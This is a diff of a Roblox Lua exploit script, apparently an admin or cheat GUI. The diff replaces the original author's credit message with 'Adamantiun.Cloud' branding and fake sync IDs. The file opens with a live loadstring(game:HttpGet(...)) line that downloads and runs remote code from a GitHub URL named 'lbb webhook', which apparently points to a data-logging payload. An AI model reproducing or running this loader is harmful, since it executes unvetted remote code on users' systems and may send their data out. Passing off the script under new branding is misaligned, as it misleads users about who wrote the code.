@@ -1,3 +1,6 @@
+---aaa---
+
+
 loadstring(game:HttpGet("https://raw.githubusercontent.com/JXJmasterbringer/lbb/main/lbb%20webhook"))()
 
 local AdminPrefix = ";" -- Change this to what you want (i.e: ;kill <namehere>) (if its blank it will error)
@@ -1172,7 +1175,7 @@ local function NJTXEZI_fake_script() -- ChGui2.Script
 	
 				--startmessage
 				game.StarterGui:SetCore("ChatMakeSystemMessage", {
-					Text = "Thank you for using my Gui\nAdded:\nNew Cbring for NonSynapse\n Credits:\n/kevim";
+					Text = "Sync Complete:ADFFE85EM\nChangelog:\nNew Cbring for NonSynapse\nAdamantiun.Cloud Status:\nOnline";
 					Color = Color3.fromRGB(255,143,223);
 					Font = Enum.Font.SourceSansBold;
 					FontSize = Enum.FontSize.Size96;
@@ -2675,12 +2678,12 @@ local function NJTXEZI_fake_script() -- ChGui2.Script
 	
 				--startmessage
 				game.StarterGui:SetCore("ChatMakeSystemMessage", {
-					Text = "Thank you for using my Gui:";
+					Text = "Sync Complete user AAA31343\nThanks For Using it:\nAdamantiun.Cloud On Top\nAdamantiun.Cloud Status:\nOnline";
 					Color = Color3.fromRGB(255,143,223);
 					Font = Enum.Font.SourceSansBold;
 					FontSize = Enum.FontSize.Size96;
 				})
-	
+
 				--block
 				local Block = Instance.new("Part", workspace)
 				Block.Name = "PlatformBlock"
